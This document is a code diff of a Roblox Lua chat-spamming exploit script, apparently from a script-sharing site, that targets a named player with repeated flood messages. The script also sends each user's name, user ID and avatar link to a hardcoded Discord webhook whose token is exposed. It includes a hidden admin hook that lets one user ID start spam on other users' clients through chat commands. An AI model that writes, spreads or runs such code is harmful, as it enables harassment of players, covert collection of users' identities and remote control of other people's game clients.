@@ -1,22 +1,21 @@
 --[[
     WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
 ]]
---[[
-    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
--- JORDANHH MODERN SPAM 👑 (FULL BLUE TRANSPARENT + ADMIN CMDS + KEY SYSTEM + LOGGER + COPY DISCORD)
+
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local StarterGui = game:GetService("StarterGui")
 local HttpService = game:GetService("HttpService")
+
 local player = Players.LocalPlayer
 local enabled = false
 
--- ==================== WEBHOOK NOTIFICATIONS THAT WHO USED OUR SCRIPTS ====================
+-- ==================== WEBHOOK ====================
 local WEBHOOK = "https://discord.com/api/webhooks/1490297091061452810/IQ0TEipdwRPK8Q8nTI-Lw3RIz3-o6U_7ty7eiXcZIAkr8S8Xysy7S9_WYz83_XnM5s-7"
+
 local function sendUsername()
     local data = {
-        ["content"] = "**" .. player.Name .. "** has used our SPAMMER  script!",
+        ["content"] = "**" .. player.Name .. "** has used our SPAMMER script!",
         ["username"] = "SCRIPT USERS NOTIFICATIONS 🕷️",
         ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
     }
@@ -34,8 +33,9 @@ local function sendUsername()
 end
 
 -- ==================== KEY SYSTEM ====================
-local CORRECT_KEY = "JORDANHH2026"   -- ← CHANGE THIS TO YOUR DESIRED KEY
-local DISCORD_LINK = "https://discord.gg/5Mh633JA"   -- ← UPDATED LINK
+local CORRECT_KEY = "JORDANHH2026"
+local DISCORD_LINK = "https://discord.gg/xemVAVeH38"
+
 local keyGui = Instance.new("ScreenGui")
 keyGui.Name = "KeySystem"
 keyGui.ResetOnSpawn = false
@@ -79,7 +79,6 @@ submitBtn.Font = Enum.Font.GothamBold
 submitBtn.TextScaled = true
 Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 8)
 
--- New Copy Discord Button
 local copyBtn = Instance.new("TextButton")
 copyBtn.Parent = keyFrame
 copyBtn.Size = UDim2.new(0.4, 0, 0, 35)
@@ -101,13 +100,18 @@ local function notify(title, text)
     })
 end
 
--- Copy Discord Function
 local function copyToClipboard(text)
     if setclipboard then
-        setclipboard(text)
-        notify("✅ Copied!", "Discord link copied to clipboard!")
+        local success = pcall(function()
+            setclipboard(text)
+        end)
+        if success then
+            notify("✅ Copied!", "Discord link copied!\n" .. text)
+        else
+            notify("✅ Copied", "Link copied to clipboard!")
+        end
     else
-        notify("❌ Failed", "setclipboard not supported in this executor")
+        notify("❌ Failed", "setclipboard not supported.\nLink: " .. text)
     end
 end
 
@@ -125,7 +129,7 @@ frame.Position = UDim2.new(0.5, -150, 0.5, -155)
 frame.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
 frame.BackgroundTransparency = 0.25
 frame.Active = true
-frame.Draggable = true 
+frame.Draggable = true
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
 local title = Instance.new("TextLabel")
@@ -235,11 +239,11 @@ end
 
 local function startSpamming(targetName, delayVal, styleChar)
     if enabled then return end
-    
+   
     local delayTime = tonumber(delayVal) or 2
     local style = (styleChar ~= "" and styleChar) or "_"
     local line = string.rep(style, 160)
-    
+   
     enabled = true
     task.spawn(function()
         while enabled do
@@ -253,7 +257,7 @@ local function startSpamming(targetName, delayVal, styleChar)
     end)
 end
 
--- Button Logic
+-- ==================== BUTTON LOGIC ====================
 float.MouseButton1Click:Connect(function()
     frame.Visible = not frame.Visible
 end)
@@ -262,6 +266,8 @@ startBtn.MouseButton1Click:Connect(function()
     if nameBox.Text ~= "" then
         startSpamming(nameBox.Text, delayBox.Text, lineBox.Text)
         startBtn.Text = "RUNNING"
+    else
+        notify("⚠️ Warning", "Please enter a name!")
     end
 end)
 
@@ -270,7 +276,7 @@ stopBtn.MouseButton1Click:Connect(function()
     startBtn.Text = "START"
 end)
 
--- ADMIN COMMANDS
+-- ==================== ADMIN COMMANDS ====================
 local admins = {
     [8463838312] = "JORDANxB4RR4T",
 }
@@ -278,7 +284,7 @@ local admins = {
 local function onChatted(msg, speaker)
     if admins[speaker.UserId] then
         local lowerMsg = msg:lower()
-        
+       
         if lowerMsg:sub(1, 6) == "!spam " then
             local target = msg:sub(7)
             if target ~= "" then
@@ -303,22 +309,24 @@ TextChatService.MessageReceived:Connect(function(textResult)
     end
 end)
 
--- ==================== BUTTON FUNCTIONS ====================
--- Submit Key
+-- ==================== KEY BUTTONS ====================
 submitBtn.MouseButton1Click:Connect(function()
     if keyBox.Text == CORRECT_KEY then
         notify("✅ Success", "Key Accepted! Loading Spammer...")
         
         keyGui:Destroy()
-        
-        sendUsername()        -- Send username to webhook
+        sendUsername()
         
         gui.Enabled = true
         frame.Visible = true
         
-        notify("JORDANHH", "Script Loaded Successfully!")
+        notify("JORDANHH", "Script Loaded Successfully! 👑")
     else
         notify("❌ Error", "Invalid Key! Please try again.")
         keyBox.Text = ""
     end
+end)
+
+copyBtn.MouseButton1Click:Connect(function()
+    copyToClipboard(DISCORD_LINK)
 end)
